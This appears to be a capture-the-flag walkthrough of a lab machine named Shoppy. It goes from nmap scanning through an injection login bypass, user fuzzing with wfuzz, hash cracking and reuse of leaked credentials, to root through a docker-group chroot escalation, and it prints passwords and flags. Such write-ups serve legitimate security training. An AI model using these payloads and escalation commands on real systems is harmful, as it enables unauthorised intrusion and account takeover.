IP: 10.10.11.180
# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/shoppy 10.10.11.180
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-09 23:34 EST
Nmap scan report for 10.10.11.180
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
	
Hostname: shoppy.htb
# Webapp
## Site 1
Login page at shoppy.htb/login

Bypass authentication with sqli
```sql
'||'1==1
```
which can enumerate users.
```bash
wfuzz -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ'||'1==1&password=password" --hh 51 http://shoppy.htb/login
```
Found 2 valid users, Josh and admin.

You can get the user's hashes. from the search button on the website.
josh:6ebcea65320589ca4f2f1ce039975995
Looks like a md5sum which cracks to `remembermethisway`.

Try to ssh onto the box, but it doesn't work.
## Site 2
Check for subdomains.
```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomain-top100000.txt --hh 169 -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb"
```
Result of mattermost.

In one of the channels there is talk about docker and creds for jaeger.
```
jaeger:Sh0ppyBest@pp!
```
# Foothold
ssh onto the box: 

User flag: 
```
00205ca0b36ca0c118f497536ca0d354
```
Check sudo -l 

can run /home/deploy/password-manager as deploy

## Reversing the binary (very badly)
cat the binary, and manually check for strings.
```
Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
```
If you run the application 
```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: apples?
Access denied! This incident will be reported !
```
The 'Sample' string doesn't show.

Trying that as the password works!
```txt
Deploy Creds :
username: deploy
password: Deploying@pp!
```
## An aside
A cleaner way would be to run `strings -el ./password-manager`. You have to use the -el flag cause of how the password is created in the source code. It will append a null byte to each letter causing strings to miss it.
```
std::string master_password = "";
    master_password += "S";
    master_password += "a";
    master_password += "m";
    master_password += "p";
    master_password += "l";
    master_password += "e";
```
Or the binary in hex:
```
00002050: 2070 6173 7377 6f72 643a 2000 0053 0061   password: ..S.a
00002060: 006d 0070 006c 0065 0000 0000 0000 0000  .m.p.l.e........
```

# Priv esc
Switch user
```bash
su deploy
```

Running `id` shows that deploy is part of the docker group.

GTFObins has a docker privesc
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```
This will mount the host file system within the docker container and run it as root.

root flag: 
```
981640e1702857397b42e654b62d6423
```

